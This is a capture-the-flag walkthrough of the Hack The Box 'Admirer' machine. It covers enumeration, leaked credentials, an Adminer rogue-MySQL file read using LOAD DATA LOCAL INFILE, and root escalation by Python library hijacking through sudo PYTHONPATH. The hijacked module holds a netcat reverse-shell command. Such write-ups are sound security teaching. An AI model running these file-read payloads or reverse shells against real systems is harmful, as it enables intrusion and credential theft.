![](admirer-banner.png)

<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="https://www.hackthebox.eu/badge/image/391067"></img></a>
</p>

# Scanning

## Nmap

`ports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.10.187 | grep open | awk -F / '{print $1}' ORS=',') echo $ports && nmap -p$ports -sV -sC -v -T4 -oA scans/nmap.full 10.10.10.187`

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry
|_/admin-dir
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Admirer
```

### Web_server

- /robots.txt

	  This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo
	  Disallow: /admin-dir

    - potential username **waldo**

- /admin-dir

	  forbidden - permission denied

## Gobuster 
>**_/admin-dir/_**

`gobuster dir -u http://10.10.10.187/admin-dir/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x txt,php -t 50`
```
/contacts.txt (Status: 200)
/credentials.txt (Status: 200)
```

- `/contacts.txt` contains some emails

	  # Penny:p.wise@admirer.htb
	  # Rajesh:r.nayyar@admirer.htb
	  # Amy:a.bialik@admirer.htb
	  # Leonard:l.galecki@admirer.htb
	  # Howard:h.helberg@admirer.htb
	  # Bernadette:b.rauch@admirer.htb

  - Don't find any usages of these emails.

- `credentials.txt` contains some creds

	**[FTP account]** `ftpuser:%n?4Wz}R$tTF7`

	**[Wordpress account]** `admin:w0rdpr3ss01!`

	**[Internal mail account]** `w.cooper@admirer.htb:fgJr6q#S\W:$P`

  - found working `FTP` creds

### FTP

`ftp 10.10.10.187`
```
-rw-r--r--	1 0	0	   3405 Dec 02  2019 dump.sql
-rw-r--r--	1 0	0	5270987 Dec 02  2019 html.tar.gz
```

#### wget FTP files
`wget --user ftpuser --password '%n?4Wz}R$tTF7' -m ftp://10.10.10.187`
```
dump.sql  html.tar.gz
```

- **`dump.sql`** *holds the table of images and text shown on the main page.*
- **`html.tar.gz`** *holds the source for the webpage.*

	`tar -tf html.tar.gz`

	  assets/
	  ...
	  images/
	  ...
	  index.php
	  robots.txt
	  utility-scripts/
	  utility-scripts/phptest.php
	  utility-scripts/info.php
	  utility-scripts/db_admin.php
	  utility-scripts/admin_tasks.php
	  w4ld0s_s3cr3t_d1r/
	  w4ld0s_s3cr3t_d1r/credentials.txt
	  w4ld0s_s3cr3t_d1r/contacts.txt

  - Found more creds
	- inside `index.php`

		  $servername = "localhost";
		  $username = "waldo";
		  $password = "]F7jLHw:*G>UPrTo}~A"d6b";
		  $dbname = "admirerdb";

	- and in `utility-scripts/db_admin.php`

		  $servername = "localhost";
		  $username = "waldo";
		  $password = "Wh3r3_1s_w4ld0?";

  - but not working. There is a new web directory `utility-scripts`

## Gobuster 
>**_/utility-scripts/_**

`gobuster dir --url http://10.10.10.187/utility-scripts/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -x php,txt -t 50`
```
/adminer.php (Status: 200)
```

### /adminer.php
>Browsing `http://10.10.10.187/utility-scripts/adminer.php`

**_Found_**

- Adminer login panel
- `version 4.6.2`

#### Google
**search :** `adminer`

**_search results_**

* [Adminer](https://www.adminer.org/) is a Database management tool for MYSQL
* version 4.6.2 and above <4.7.0 have Serious Vulnerability,
	[foregenix.com blog](https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool)
* Vulnerability first discovered by security researchers Yashar Shahinzadeh,
	[yashar medium blog](https://medium.com/bugbountywriteup/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f)
* How this Vulnerability works
    * **First**, the attacker will access the victim’s Adminer instance, but instead of trying to connect to thevictim’s MySQL database, they connect “back” to their own MySQL database hosted on their own server.

    * **Second**, using the victim’s Adminer (connected to their own database) – they use the MySQL command specifying a local file on the victim’s server. This command is used to load data from a file local to the Adminer instance, into a database.
	  *sql command for loading file from Adminer instance

		  LOAD DATA LOCAL INFILE '/etc/passwd' 
		  INTO TABLE test
		  FIELDS TERMINATED BY "\n"

# User Exploiting

## sql

* **First**, setup mysql server in my local machine

	  $ sudo service mysql start	//start mysql service
	  $ sudo mysql -u root	//login as root user in our sql server
	  > create database ladmirer;	//create database
	  > show databases;
	  //setup user 
	  > create user 'luser'@'%' IDENTIFIED BY 'lpass';
	  > GRANT ALL PRIVILEGES ON * . * TO 'username'@'%';
	  > FLUSH PRIVILEGES;
	  > create table test (data VARCHAR(225)); //create test data in the created database

* **Second** , bind server to `tun0` address by editing cnf file

	  nano /etc/mysql/mariadb.conf.d/50-server.cnf
		bind-address  = 0.0.0.0		//change bind address to tun0 or 0.0.0.0 

* **Third**, restart mysql service

	  $ sudo service mysql restart
	  $ mysql -h localhost -u luser -p 	//testing created user
		> lpass		//password

* **Fourth**, login to adminer and connect back to my local sql server

	  System = MySQL
	  Server = tun0
	  Username = luser
	  Password = lpass
	  Database = ladmirer

* **Fifth**, dump remote server database by running this command from `SQL Command` terminal in adminer

	  load data local infile '/var/www/html/index.php'
	  into table test
	  fields terminated by "/n"

> try to read `/etc/passwd` got an error

> reading `/var/www/html/index.php` dump 123 rows*

* **Sixth**, read dumped `adminer.php` file in SQL command terminal in adminer

	  SELECT * from ladmirer.test;
	
	**_interesting data inside dump_**

	  $servername = \"localhost\";
	  $username = \"waldo\";
	  $password = \"&<h5b~yK3F#{PaPB&dA}{H>\";
	  $dbname = \"admirerdb\";


* login into ssh with found creds `waldo:&<h5b~yK3F#{PaPB&dA}{H>` 

# Local Enumeration

- check sudo rights for user waldo

	  waldo@admirer:~$ sudo -l
	  [sudo] password for waldo: 
	  Matching Defaults entries for waldo on admirer:
	      env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=always

	  User waldo may run the following commands on admirer:
	      (ALL) SETENV: /opt/scripts/admin_tasks.sh

	**_what i have here_**
	* i can set environment variables for `/opt/scripts/admin_tasks.sh`
	* i can run `/opt/scripts/admin_tasks.sh` as root

- review `/opt/scripts/`

	  waldo@admirer:/opt/scripts$ ls -la
	  -rwxr-xr-x 1 root admins 2613 Dec  2  2019 admin_tasks.sh
	  -rwxr----- 1 root admins  198 Dec  2  2019 backup.py

    - in `admin_tasks.sh`

		  backup_web()
		  {
		      if [ "$EUID" -eq 0 ]
		      then
			  echo "Running backup script in the background, it might take a while..."
			  /opt/scripts/backup.py &
		      else
			  echo "Insufficient privileges to perform the selected operation."
		      fi
		  }

    - and in `backup.py`

		  from shutil import make_archive

	**These looks suspicious**
	* script itself not vulnerable
	* script `admin_tasks.sh` calling `backup.py` in 6th `backup_web()` option.
	* script `backup.py` importing shutil library


## Exploit surface

- user `waldo` can set environment variables for the script, [sudo man](https://linux.die.net/man/5/sudoers)
- this means we can set python path for `/opt/scripts`
- here i can use python hijacking to exploit root, [rastating article](https://rastating.github.io/privilege-escalation-via-python-library-hijacking/)

# Root Privesc 

* **Frist**, create dummy `shutil.py` file with reverse shell in it.

	  import os
	  def make_archive(x, y, z):
		  os.system("nc tun0 4141 -e '/bin/bash'")

* **Second**, start netcat listener
* **Third**, run `admin_tasks.sh` script, 

	  waldo@admirer:~$ sudo PYTHONPATH=/tmp /opt/scripts/admin_tasks.sh 6

  * use option 6 to excute `backup.py` script
  * using `PYTHONPATH` to set python path for `backup.py` to import `shutil.py` from my path.